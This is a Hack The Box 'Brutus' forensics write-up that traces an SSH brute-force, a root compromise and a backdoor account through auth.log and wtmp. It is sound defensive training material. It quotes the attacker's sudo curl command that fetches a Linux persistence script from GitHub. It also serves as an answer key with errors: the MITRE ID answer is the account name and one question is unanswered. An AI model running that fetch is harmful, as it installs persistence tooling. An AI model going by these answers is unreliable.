# Brutus
> Write-up author: Ittiwat Nimitliupanit
> 
> Category: SOC Investigation / Linux Log Analysis
> 
> Platform: Hack The Box Sherlocks

![image](./images/Brutus.png)

## Scenario
In this Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

| File | Description | Purpose in Investigation |
|---|---|---|
| `auth.log` | Linux authentication log containing SSH login attempts, failed passwords, accepted logins, session activity, and sudo-related events. | Used to investigate brute-force attempts, successful authentication, affected users, source IP addresses, and attacker activity timeline. |
| `wtmp` | Binary Linux log file that records login, logout, reboot, and session information. | Used to verify successful logins and user session history. |
| `utmp.py` | Python script used to parse or analyse `wtmp`/login session data. | Used to extract readable login records from binary session files for timeline analysis. |

## Step
1.  Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
>
![image](./images/AttackerIP.png)
>
The `auth.log` file shows multiple failed SSH authentication attempts. In the highlighted log entries, the source IP address `65.2.161.68` repeatedly attempted to authenticate as the user `admin`.
> ANS: `65.2.161.68`
> 
As reviewing a log file, it noticed that there are 2 IP address which are `203.101.190.9` and `65.2.161.68`.
>
2.  The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
>
I investigated more in the auth.log file and found the log that accepted a password for root from 65.2.161.68 which is an attacker IP. This means the account has been compromised already.
>
![image](./images/PasswordAccept.png)
>
> ANS: `root`
>
3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
>
We noticed that wtmp file can not open it normally. So, we need to run the Python script that included in this challenge to analyze the wtmp log.
>
We can do this by using:
```
python3 utmp.py -o wtmp.out wtmp
```
After that, now we can read a file and it show the timestamp when attacker login and we also get information that new account (Cyberjunkie) was created by attacker
>
![image](./images/AttackerLogin.png)
>
> ANS: As the answer must be in UTC so it will +5 from my local time `2024-03-06 06:32:45`
>
4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
>
Since 34 is the first login it open and disconnect immediately, so we got the another session which is 37 that attacker was performed the attack.
>
![image](./images/Session.png)
> ANS: `37`
>
5.  The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
>
> ANS: `cyberjunkie`
>
6.  What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
>
> ANS: `cyberjunkie`
>
7.  What time did the attacker's first SSH session end according to auth.log?
8.  The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
>
> Ans: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
